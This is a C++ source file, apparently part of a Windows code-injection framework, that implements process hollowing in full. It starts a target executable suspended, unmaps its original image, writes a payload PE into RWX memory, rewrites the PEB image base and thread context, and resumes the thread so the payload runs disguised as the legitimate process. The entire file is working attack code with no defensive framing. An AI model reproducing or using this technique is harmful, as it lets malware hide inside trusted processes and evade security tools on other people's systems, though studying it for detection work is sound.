#include "handler_process.h"

#include "ntdll_utils.h"
#include "payload_utils.h"
#include "pe_utils.h"
#include "process_utils.h"

#include <algorithm>
#include <cstdint>
#include <filesystem>
#include <optional>
#include <string>
#include <vector>

#ifndef _WIN32

dispatch_outcome handle_process_hollowing(const rw_injection_request*, const parsed_params&)
{
    return { false, "TECHNIQUE_UNSUPPORTED_PLATFORM", "Technique not implemented on this platform." };
}

#else

#include <windows.h>

namespace
{
    dispatch_outcome param_required(const char* message)
    {
        return { false, "TECHNIQUE_PARAM_REQUIRED", message };
    }

    dispatch_outcome param_invalid(const char* message)
    {
        return { false, "TECHNIQUE_PARAM_INVALID", message };
    }

    bool file_exists(const std::string& path)
    {
        if (path.empty())
        {
            return false;
        }

        std::error_code ec;
        return std::filesystem::is_regular_file(std::filesystem::path(path), ec);
    }

    std::string quote_if_needed(const std::string& value)
    {
        if (value.find_first_of(" \t") == std::string::npos)
        {
            return value;
        }

        std::string quoted;
        quoted.reserve(value.size() + 2);
        quoted.push_back('"');
        quoted.append(value);
        quoted.push_back('"');
        return quoted;
    }

    std::string build_command_line(const std::string& image_path, const char* args)
    {
        std::string cmd = quote_if_needed(image_path);
        if (args && args[0] != '\0')
        {
            cmd.push_back(' ');
            cmd.append(args);
        }
        return cmd;
    }

}

dispatch_outcome handle_process_hollowing(const rw_injection_request* req, const parsed_params& params)
{
    if (!req)
    {
        return { false, "NULL_REQUEST", "Injection request pointer was null." };
    }

    std::string target_image;
    if (const auto value = params.get_string("targetImagePath"))
    {
        if (value->empty())
        {
            return param_invalid("targetImagePath must be non-empty when provided.");
        }
        target_image = *value;
    }
    else if (params.has_non_empty("targetImagePath"))
    {
        return param_invalid("targetImagePath must be a string.");
    }
    else if (req->target.kind == RW_TARGET_LAUNCH_PROCESS && req->target.launch_path && req->target.launch_path[0] != '\0')
    {
        target_image = req->target.launch_path;
    }
    else
    {
        return param_required("ProcessHollowing requires targetImagePath or a launch target.");
    }

    std::optional<std::string> command_line;
    if (const auto value = params.get_string("commandLine"))
    {
        if (value->empty())
        {
            return param_invalid("commandLine must be non-empty when provided.");
        }
        command_line = *value;
    }
    else if (params.has_non_empty("commandLine"))
    {
        return param_invalid("commandLine must be a string.");
    }
    else if (req->target.kind == RW_TARGET_LAUNCH_PROCESS && req->target.launch_arguments && req->target.launch_arguments[0] != '\0')
    {
        command_line = build_command_line(target_image, req->target.launch_arguments);
    }

    const char* payload_path = req->payload_path;
    if (!payload_exists(payload_path))
    {
        return { false, "PAYLOAD_NOT_FOUND", "Process hollowing payload was not found." };
    }

    std::vector<unsigned char> payload;
    if (!read_payload_file(payload_path, payload))
    {
        return { false, "PAYLOAD_READ_FAILED", "Failed to read process hollowing payload." };
    }

    if (!file_exists(target_image))
    {
        return { false, "TARGET_IMAGE_NOT_FOUND", "Target image to hollow was not found." };
    }

    dispatch_outcome failure{};
    pe_image info{};
    if (!parse_pe_image(payload, info, failure, true))
    {
        return failure;
    }

    STARTUPINFOA startup_info{};
    startup_info.cb = sizeof(startup_info);
    PROCESS_INFORMATION process_info{};

    std::string command = command_line.value_or("");
    if (command.empty())
    {
        command = build_command_line(target_image, nullptr);
    }

    std::vector<char> command_buffer;
    char* command_ptr = nullptr;
    if (!command.empty())
    {
        command_buffer.assign(command.begin(), command.end());
        command_buffer.push_back('\0');
        command_ptr = command_buffer.data();
    }

    const char* working_dir = nullptr;
    if (req->target.kind == RW_TARGET_LAUNCH_PROCESS &&
        req->target.launch_working_directory &&
        req->target.launch_working_directory[0] != '\0')
    {
        working_dir = req->target.launch_working_directory;
    }

    if (!::CreateProcessA(target_image.c_str(),
            command_ptr,
            nullptr,
            nullptr,
            FALSE,
            CREATE_SUSPENDED,
            nullptr,
            working_dir,
            &startup_info,
            &process_info))
    {
        return { false, "PROCESS_CREATE_FAILED", "Failed to create suspended target process." };
    }

    auto fail_cleanup = [&](const dispatch_outcome& fail) -> dispatch_outcome
    {
        ::TerminateProcess(process_info.hProcess, 0);
        ::CloseHandle(process_info.hThread);
        ::CloseHandle(process_info.hProcess);
        return fail;
    };

    bool target_wow64 = false;
    if (!get_is_wow64(process_info.hProcess, target_wow64))
    {
        return fail_cleanup({ false, "TARGET_ARCH_CHECK_FAILED", "Failed to determine target architecture." });
    }

#ifdef _WIN64
    if (!info.is64 || target_wow64)
    {
        return fail_cleanup({ false, "TARGET_ARCH_UNSUPPORTED", "Cross-architecture process hollowing is not supported." });
    }
#else
    if (info.is64)
    {
        return fail_cleanup({ false, "TARGET_ARCH_UNSUPPORTED", "Cross-architecture process hollowing is not supported." });
    }
#endif

    CONTEXT context{};
    context.ContextFlags = CONTEXT_FULL;
    if (!::GetThreadContext(process_info.hThread, &context))
    {
        return fail_cleanup({ false, "THREAD_CONTEXT_FAILED", "Failed to read thread context." });
    }

    unsigned char* peb_address = nullptr;
    uintptr_t remote_image_base = 0;
#ifdef _WIN64
    peb_address = reinterpret_cast<unsigned char*>(context.Rdx);
    if (!peb_address)
    {
        return fail_cleanup({ false, "PEB_READ_FAILED", "Failed to resolve PEB address." });
    }

    if (!::ReadProcessMemory(process_info.hProcess, peb_address + 0x10, &remote_image_base, sizeof(remote_image_base), nullptr))
    {
        return fail_cleanup({ false, "PEB_READ_FAILED", "Failed to read target PEB." });
    }

    if (remote_image_base == 0)
    {
        return fail_cleanup({ false, "PEB_READ_FAILED", "Target PEB image base was invalid." });
    }
#else
    peb_address = reinterpret_cast<unsigned char*>(context.Ebx);
    if (!peb_address)
    {
        return fail_cleanup({ false, "PEB_READ_FAILED", "Failed to resolve PEB address." });
    }

    if (!::ReadProcessMemory(process_info.hProcess, peb_address + 0x8, &remote_image_base, sizeof(remote_image_base), nullptr))
    {
        return fail_cleanup({ false, "PEB_READ_FAILED", "Failed to read target PEB." });
    }

    if (remote_image_base == 0)
    {
        return fail_cleanup({ false, "PEB_READ_FAILED", "Target PEB image base was invalid." });
    }
#endif

    NtUnmapViewOfSection_t unmap_view = resolve_nt_unmap_view_of_section();
    if (!unmap_view)
    {
        return fail_cleanup({ false, "NT_UNMAP_VIEW_NOT_FOUND", "Failed to resolve NtUnmapViewOfSection." });
    }

    unmap_view(process_info.hProcess, reinterpret_cast<PVOID>(remote_image_base));

    void* remote_base = ::VirtualAllocEx(process_info.hProcess,
        reinterpret_cast<void*>(info.image_base),
        info.size_of_image,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    uint64_t mapped_base = reinterpret_cast<uint64_t>(remote_base);
    if (!remote_base)
    {
        remote_base = ::VirtualAllocEx(process_info.hProcess,
            nullptr,
            info.size_of_image,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);

        if (!remote_base)
        {
            return fail_cleanup({ false, "PAYLOAD_ALLOC_FAILED", "Failed to allocate memory for payload image." });
        }

        mapped_base = reinterpret_cast<uint64_t>(remote_base);
        if (!apply_relocations(payload, info, mapped_base, failure))
        {
            return fail_cleanup(failure);
        }
    }

    if (!write_image_to_process(process_info.hProcess, info, payload, remote_base, failure))
    {
        return fail_cleanup(failure);
    }

    ::FlushInstructionCache(process_info.hProcess, remote_base, info.size_of_image);

    uintptr_t new_image_base = reinterpret_cast<uintptr_t>(remote_base);
#ifdef _WIN64
    if (!::WriteProcessMemory(process_info.hProcess, peb_address + 0x10, &new_image_base, sizeof(new_image_base), nullptr))
    {
        return fail_cleanup({ false, "PEB_WRITE_FAILED", "Failed to update target PEB image base." });
    }
#else
    if (!::WriteProcessMemory(process_info.hProcess, peb_address + 0x8, &new_image_base, sizeof(new_image_base), nullptr))
    {
        return fail_cleanup({ false, "PEB_WRITE_FAILED", "Failed to update target PEB image base." });
    }
#endif

    uint64_t entry_point = mapped_base + info.entry_rva;
#ifdef _WIN64
    context.Rcx = entry_point;
#else
    context.Eax = static_cast<DWORD>(entry_point);
#endif

    if (!::SetThreadContext(process_info.hThread, &context))
    {
        return fail_cleanup({ false, "THREAD_CONTEXT_FAILED", "Failed to update thread context." });
    }

    if (::ResumeThread(process_info.hThread) == static_cast<DWORD>(-1))
    {
        return fail_cleanup({ false, "THREAD_RESUME_FAILED", "Failed to resume hollowed process thread." });
    }

    ::CloseHandle(process_info.hThread);
    ::CloseHandle(process_info.hProcess);
    return { true, nullptr, nullptr };
}

#endif
